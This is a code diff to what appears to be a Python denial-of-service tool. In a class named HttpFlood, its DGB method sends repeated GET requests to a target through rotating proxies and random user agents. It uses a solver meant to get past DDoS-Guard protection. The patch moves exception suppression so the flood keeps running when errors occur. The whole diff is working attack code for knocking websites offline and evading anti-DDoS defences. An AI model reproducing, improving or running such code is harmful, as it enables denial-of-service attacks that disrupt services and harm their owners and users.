@@ -193,7 +193,7 @@ class Tools:
     def dgb_solver(url, host, ua, pro=None):
         s = None
         idss = None
-        with suppress(Exception), Session() as s:
+        with Session() as s:
             if pro:
                 s.proxies=pro
             hdrs = {
@@ -858,26 +858,27 @@ class HttpFlood(Thread):
     
     def DGB(self):
         global REQUESTS_SENT, BYTES_SEND
-        if self._proxies:
-            pro = randchoice(self._proxies)
-            with Tools.dgb_solver(self._target.human_repr(),self._host,randchoice(self._useragents),pro.asRequest()) as ss:
+        with suppress(Exception):
+            if self._proxies:
+                pro = randchoice(self._proxies)
+                with Tools.dgb_solver(self._target.human_repr(),self._host,randchoice(self._useragents),pro.asRequest()) as ss:
+                    for _ in range(min(self._rpc, 5)):
+                        sleep(min(self._rpc, 5) / 100)
+                        with ss.get(self._target.human_repr(),
+                                    proxies=pro.asRequest()) as res:
+                            REQUESTS_SENT += 1
+                            BYTES_SEND += Tools.sizeOfRequest(res)
+                                
+                Tools.safe_close(ss)
+
+            with Tools.dgb_solver(self._target.human_repr(),self._host,randchoice(self._useragents)) as ss:
                 for _ in range(min(self._rpc, 5)):
                     sleep(min(self._rpc, 5) / 100)
-                    with ss.get(self._target.human_repr(),
-                                proxies=pro.asRequest()) as res:
+                    with ss.get(self._target.human_repr()) as res:
                         REQUESTS_SENT += 1
                         BYTES_SEND += Tools.sizeOfRequest(res)
                             
             Tools.safe_close(ss)
-
-        with Tools.dgb_solver(self._target.human_repr(),self._host,randchoice(self._useragents)) as ss:
-            for _ in range(min(self._rpc, 5)):
-                sleep(min(self._rpc, 5) / 100)
-                with ss.get(self._target.human_repr()) as res:
-                    REQUESTS_SENT += 1
-                    BYTES_SEND += Tools.sizeOfRequest(res)
-                        
-        Tools.safe_close(ss)
             
         
 
